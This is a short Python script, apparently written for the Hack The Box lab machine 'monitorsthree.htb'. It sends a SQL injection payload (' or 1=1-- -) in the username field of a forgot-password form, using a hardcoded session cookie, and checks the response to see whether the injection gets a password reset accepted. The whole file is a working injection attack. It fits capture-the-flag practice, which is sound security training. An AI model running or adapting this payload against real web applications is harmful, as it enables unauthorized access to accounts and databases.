#!/usr/bin/python3

from pwn import *
import requests, time, string, pdb, signal, re

def def_handler(sig, frame):
  print("\n\n[!] Saliendo...")
  sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)
main_url='http://monitorsthree.htb/forgot_password.php'
PHPSESSID='8vop3di5s6t86v6g25gleau7cs'
sqli="' or 1=1-- -"
data={'username': sqli}
cookies= {'PHPSESSID': PHPSESSID}
if __name__ == '__main__':
  r=requests.post(main_url, cookies=cookies, data=data)
  print(r.content)
  if "Successfully sent password reset request" in r.text:
    print("Hola que tal")
